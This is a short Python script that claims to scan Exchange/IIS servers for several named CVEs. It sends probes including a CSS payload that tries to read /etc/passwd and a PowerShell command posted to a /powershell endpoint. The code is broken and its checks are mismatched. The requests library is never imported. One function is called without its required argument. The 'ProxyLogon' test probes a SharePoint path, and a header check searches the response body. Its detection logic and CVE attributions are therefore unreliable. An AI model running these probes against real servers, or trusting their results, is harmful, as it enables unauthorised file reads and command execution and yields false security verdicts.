#!/usr/bin/python3

#Check ProxyLogon
def CVE202131207(url):
    url = "http://example.com"
    try:
        r = requests.get(url + '/_vti_bin/owssvr.dll?CS=65001', allow_redirects=False)
        if r.status_code == 401:
            print("Proxylogon vulnerability exists.")
        else:
            print("Proxylogon vulnerability does not exist.")
    except requests.exceptions.RequestException as e:
        print("Error:", e)



def check_cve_2020_16875(url):
    headers = {'User-Agent': 'test-cve-2020-16875'}
    try:
        r = requests.get(url + '/_vti_bin/shtml.dll/_vti_rpc', headers=headers)
        if "Server: Microsoft-IIS/10.0" in r.text:
            print("Server is running IIS 10.0 and may be vulnerable to:  \nCVE-2020-16875\nCVE-2021-31206\nCVE-2021-31198\nCVE-2021-31196\nCVE-2021-31195\nCVE-2021-28483\nCVE-2021-28481\nCVE-2021-28480\nCVE-2021-27065. \nCheck for more CVE in CVE Database")
        else:
            print("Server is not running IIS 10.0 and is not vulnerable to CVE-2020-16875.")
    except requests.exceptions.RequestException as e:
        print("Error:", e)

url = "http://example.com"

def check2020_17117():

    # Replace the URL with the target server's URL
    url = 'http://example.com/owa/auth/Current/themes/resources/logon.css'

    # The payload that will trigger the vulnerability
    payload = '''
        /*
        * The following payload is used to check if the server is vulnerable to
        * the vulnerability described in CVE-2020-17117
        */
        @import url("file:///etc/passwd");
        '''

    headers = {'Content-Type': 'text/css'}

    try:
        # Send the payload to the server
        response = requests.get(url, headers=headers, data=payload)

        # If the server is vulnerable, it will return the contents of the /etc/passwd file
        if "root:" in response.text:
            print("The server is vulnerable to CVE-2020-17117")
        else:
            print("The server is not vulnerable to CVE-2020-17117")
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

def checkRcePowershell():
        # Replace the URL with the target server's URL
    url = 'http://example.com/powershell'

    # The payload that will trigger the vulnerability
    payload = '''
        $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Exchange\Setup' -Name 'CurrentVersion').CurrentVersion
        Write-Output $ver
        '''

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    try:
        # Send the payload to the server
        response = requests.post(url, headers=headers, data=payload)

        # If the server is vulnerable, it will return the version of the exchange server
        if "15." in response.text:
            print("The server is vulnerable to Remote Command Execution")
        else:
            print("The server is not vulnerable to Remote Command Execution")
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)
 
checkRcePowershell()
check2020_17117()
CVE202131207()
